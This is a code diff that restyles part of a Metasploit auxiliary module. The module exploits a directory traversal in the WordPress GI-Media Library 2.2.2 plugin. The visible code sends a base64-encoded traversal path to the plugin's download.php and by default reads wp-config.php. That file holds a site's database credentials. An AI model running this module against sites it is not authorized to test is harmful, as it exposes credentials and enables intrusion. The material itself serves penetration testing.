@@ -9,32 +9,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress GI-Media Library Plugin Directory Traversal Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in WordPress Plugin
-        GI-Media Library version 2.2.2, allowing to read arbitrary files from the
-        system with the web server privileges. This module has been tested successfully
-        on GI-Media Library version 2.2.2 with WordPress 4.1.3 on Ubuntu 12.04 Server.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress GI-Media Library Plugin Directory Traversal Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in WordPress Plugin
+          GI-Media Library version 2.2.2, allowing to read arbitrary files from the
+          system with the web server privileges. This module has been tested successfully
+          on GI-Media Library version 2.2.2 with WordPress 4.1.3 on Ubuntu 12.04 Server.
+        },
+        'References' => [
           ['WPVDB', '7754'],
           ['URL', 'http://web.archive.org/web/20191021124407/http://wordpressa.quantika14.com/repository/index.php?id=24']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Unknown', # Vulnerability discovery - QuantiKa14?
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The wordpress file to read', 'wp-config.php']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 3 ])
-      ])
+      ]
+    )
   end
 
   def check
@@ -48,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    => normalize_uri(wordpress_url_plugins, 'gi-media-library', 'download.php'),
+      'uri' => normalize_uri(wordpress_url_plugins, 'gi-media-library', 'download.php'),
       'vars_get' =>
         {
           'fileid' => Rex::Text.encode_base64(traversal + filename)
